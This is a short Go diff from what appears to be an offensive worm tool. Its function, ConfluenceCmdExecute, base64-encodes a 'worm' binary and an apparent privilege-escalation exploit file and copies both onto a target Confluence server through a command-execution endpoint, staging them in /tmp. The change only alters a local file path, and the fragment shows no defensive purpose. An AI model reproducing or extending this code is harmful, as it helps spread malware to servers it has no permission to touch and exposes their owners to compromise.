@@ -80,7 +80,7 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		worm64 := base64.StdEncoding.EncodeToString(worm)
     CopyWorm(url, endpoint, worm64, wormPath)
 
-    worm = GetFile("./exploit_nss_manual")
+    worm = GetFile("/tmp/exploit_nss_manual")
 		worm64 = base64.StdEncoding.EncodeToString(worm)
     CopyWorm(url, endpoint, worm64, "/tmp/exploit_nss_manual")    
 
